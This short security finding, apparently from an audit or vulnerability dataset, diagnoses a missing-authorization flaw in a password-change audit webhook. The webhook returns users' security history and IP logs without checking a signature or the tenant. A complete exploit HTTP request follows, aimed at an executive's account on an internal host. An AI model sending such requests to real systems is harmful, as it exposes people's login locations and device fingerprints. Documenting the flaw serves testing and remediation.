diagnosis: The password change audit webhook queries and returns user security history and IP logs based solely on userId provided in the request body without verifying the webhook's signature or checking that the requester belongs to tenantDomain. An attacker can probe this webhook to extract user login locations and device fingerprints.
exploit_request:
POST /api/webhooks/auth0/password-changed HTTP/1.1
Host: audit-hooks.internal:9005
Content-Type: application/json

{
  "userId": "auth0|usr_cfo_exec_881",
  "tenantDomain": "finance.holding.com"
}
